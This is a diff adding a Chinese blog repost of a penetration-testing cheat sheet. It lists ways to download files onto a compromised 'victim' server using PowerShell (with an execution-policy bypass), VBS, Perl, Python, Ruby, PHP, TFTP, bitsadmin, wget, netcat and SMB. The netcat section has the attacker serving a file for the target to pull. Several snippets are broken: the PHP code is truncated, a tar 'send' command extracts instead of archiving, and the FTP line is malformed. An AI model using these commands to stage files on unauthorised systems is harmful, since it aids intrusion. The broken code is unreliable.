+        <p>本文转载自原文：<a href="https://evi1cg.me/archives/13-ways-to-download-a-file.html" target="_blank" rel="noopener">13种方式下载文件</a></p>
+<p>渗透测试过程中常常遇到需要将文件下载到受害者服务器上，这里介绍15种下载文件的方式，希望能帮助到你。</p>
+<h2 id="0x01-Powershell"><a href="#0x01-Powershell" class="headerlink" title="0x01 Powershell"></a>0x01 Powershell</h2><p>创建如下PSH脚本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$p</span> = New-Object System.Net.WebClient</span><br><span class="line"><span class="variable">$p</span>.DownloadFile(<span class="string">"http://domain/file"</span>,<span class="string">"C:%homepath%file"</span>)</span><br><span class="line"></span><br><span class="line">如：<span class="variable">$p</span>.DownloadFile(<span class="string">"http://192.168.0.111:3737/test.txt"</span>,<span class="string">"E:text_download.txt"</span>)</span><br><span class="line">注意：下载的路径如果出现中文字的路径，可能会出错</span><br></pre></td></tr></table></figure>
+<p>执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:&gt; .test.ps1</span><br></pre></td></tr></table></figure>
+<p>如果Powershell禁止执行了，使用如下命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:&gt;powershell <span class="built_in">set</span>-executionpolicy unrestricted</span><br></pre></td></tr></table></figure>
+<p>Ps：如果提示无权修改，则切换到<code>Windows\System32</code>下，管理员身份运行<code>cmd.exe</code>，再执行命令就可以</p>
+<p>使用如下命令可以查看当前的<code>executionpolicy</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">E:\&gt;powershell executionpolicy</span><br><span class="line">Restricted</span><br></pre></td></tr></table></figure>
+<p><strong>但是</strong>，后来发现只要加<code>-exec bypass</code>就可以不收<code>executionpolicy</code>的限制，执行任意脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">E:\&gt;powershell -exec bypass</span><br><span class="line">Windows PowerShell</span><br><span class="line">版权所有 (C) 2009 Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">PS E:\&gt; executionpolicy</span><br><span class="line">Bypass</span><br></pre></td></tr></table></figure>
+<h2 id="0x02-Visual-Basic"><a href="#0x02-Visual-Basic" class="headerlink" title="0x02 Visual Basic"></a>0x02 Visual Basic</h2><p>创建如下VBS脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Set args = Wscript.Arguments</span><br><span class="line">Url = <span class="string">"http://domain/file"</span></span><br><span class="line">dim xHttp: Set xHttp = createobject(<span class="string">"Microsoft.XMLHTTP"</span>)</span><br><span class="line">dim bStrm: Set bStrm = createobject(<span class="string">"Adodb.Stream"</span>)</span><br><span class="line">xHttp.Open <span class="string">"GET"</span>, Url, False</span><br><span class="line">xHttp.Send</span><br><span class="line">with bStrm</span><br><span class="line">    .<span class="built_in">type</span> = 1 <span class="string">'</span></span><br><span class="line"><span class="string">    .open</span></span><br><span class="line"><span class="string">    .write xHttp.responseBody</span></span><br><span class="line"><span class="string">    .savetofile " C:\%homepath%\file", 2 '</span></span><br><span class="line">end with</span><br></pre></td></tr></table></figure>
+<p>执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:&gt;cscript test.vbs</span><br></pre></td></tr></table></figure>
+<h2 id="0x03-Perl"><a href="#0x03-Perl" class="headerlink" title="0x03 Perl"></a>0x03 Perl</h2><p>脚本如下:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl </span></span><br><span class="line">use LWP::Simple; </span><br><span class="line">getstore(<span class="string">"http://domain/file"</span>, <span class="string">"file"</span>);</span><br></pre></td></tr></table></figure>
+<p>执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># perl test.pl</span></span><br></pre></td></tr></table></figure>
+<h2 id="0x04-Python"><a href="#0x04-Python" class="headerlink" title="0x04 Python"></a>0x04 Python</h2><p>脚本如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line">import urllib2 </span><br><span class="line">u = urllib2.urlopen(<span class="string">'http://domain/file'</span>) </span><br><span class="line">localFile = open(<span class="string">'local_file'</span>, <span class="string">'w'</span>) </span><br><span class="line">localFile.write(u.read()) </span><br><span class="line">localFile.close()</span><br></pre></td></tr></table></figure>
+<p>执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># python test.py</span></span><br></pre></td></tr></table></figure>
+<h2 id="0x05-Ruby"><a href="#0x05-Ruby" class="headerlink" title="0x05 Ruby"></a>0x05 Ruby</h2><p>脚本如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/ruby</span></span><br><span class="line">require <span class="string">'net/http'</span></span><br><span class="line">Net::HTTP.start(<span class="string">"www.domain.com"</span>) &#123; |http|</span><br><span class="line">r = http.get(<span class="string">"/file"</span>)</span><br><span class="line">open(<span class="string">"save_location"</span>, <span class="string">"wb"</span>) &#123; |file|</span><br><span class="line">file.write(r.body)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ruby test.rb</span></span><br></pre></td></tr></table></figure>
+<h2 id="0x06-PHP"><a href="#0x06-PHP" class="headerlink" title="0x06 PHP"></a>0x06 PHP</h2><p>脚本如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/php </span></span><br><span class="line"><span class="string">"http://example.com/file"</span>);</span><br><span class="line"><span class="variable">$lf</span> = <span class="string">"local_file"</span>;         </span><br><span class="line"><span class="variable">$fh</span> = fopen(<span class="variable">$lf</span>, <span class="string">'w'</span>);         </span><br><span class="line">fwrite(<span class="variable">$fh</span>, <span class="variable">$data</span>[0]);         </span><br><span class="line">fclose(<span class="variable">$fh</span>); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># php test.php</span></span><br></pre></td></tr></table></figure>
+<h2 id="0x07-FTP"><a href="#0x07-FTP" class="headerlink" title="0x07 FTP"></a>0x07 FTP</h2><p>执行如下命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp 127.0.0.1 username password get file <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+<h2 id="0x08-TFTP"><a href="#0x08-TFTP" class="headerlink" title="0x08 TFTP"></a>0x08 TFTP</h2><p>执行如下命令：</p>
+<p>复制</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tftp -i host GET C:%homepath%file location_of_file_on_tftp_server</span><br></pre></td></tr></table></figure>
+<h2 id="0x09-Bitsadmin"><a href="#0x09-Bitsadmin" class="headerlink" title="0x09 Bitsadmin"></a>0x09 Bitsadmin</h2><p>执行如下命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer n http://domain/file c:%homepath%file</span><br></pre></td></tr></table></figure>
+<h2 id="0x10-Wget"><a href="#0x10-Wget" class="headerlink" title="0x10 Wget"></a>0x10 Wget</h2><p>执行如下命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://example.com/file</span><br></pre></td></tr></table></figure>
+<h2 id="0x11-Netcat"><a href="#0x11-Netcat" class="headerlink" title="0x11 Netcat"></a>0x11 Netcat</h2><p>attacker执行如下命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat file | nc -l 1234</span><br></pre></td></tr></table></figure>
+<p>target执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc host_ip 1234 &gt; file</span><br></pre></td></tr></table></figure>
+<p><strong>Netcat补充</strong>：</p>
+<p><code>传输文件</code></p>
+<p>方法一：</p>
+<p>接收端，先监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 3737 &gt; test.txt</span><br></pre></td></tr></table></figure>
+<p>传送端，发送</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc [ip] 3737 &lt; test.txt</span><br></pre></td></tr></table></figure>
+<p>方法二：</p>
+<p>发送端，先监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 3737 &lt; test.txt</span><br></pre></td></tr></table></figure>
+<p>接收端，连接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc [ip] 3737 &gt; test.txt</span><br></pre></td></tr></table></figure>
+<p><code>传送目录</code></p>
+<p>传送目录操作与传送文件类似，但不同的是需要先压缩再解压缩，并且管道后面最后必须是 - ，不能是其余自定义的文件名</p>
+<p>接收端，先监听并准备解压缩</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 3737 | tar zxvf -</span><br></pre></td></tr></table></figure>
+<p>发送端，压缩并发送</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar zxvf - * | nc [ip] 3737</span><br></pre></td></tr></table></figure>
+<h2 id="0x12-Window-文件共享"><a href="#0x12-Window-文件共享" class="headerlink" title="0x12 Window 文件共享"></a>0x12 Window 文件共享</h2><p>使用如下命令:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use x: \127.0.0.1\share /user:example.comuserID myPassword</span><br></pre></td></tr></table></figure>
+<h2 id="0x13-记事本："><a href="#0x13-记事本：" class="headerlink" title="0x13 记事本："></a>0x13 记事本：</h2><ul>
+<li><ol>
+<li>打开记事本</li>
+</ol>
+</li>
+<li><ol>
+<li>文件，打开</li>
+</ol>
+</li>
+<li><ol>
+<li>在文件名处填入下载地址</li>
+</ol>
+</li>
+</ul>
+<p><img src="https://evi1cg.github.io/usr/uploads/2015/12/1319444800.png" alt="1-1"></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透测试</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/Knlvre.github-io/2019/10/04/十三种方式下载文件/">展开全文 >></a>
         </p>
       
 
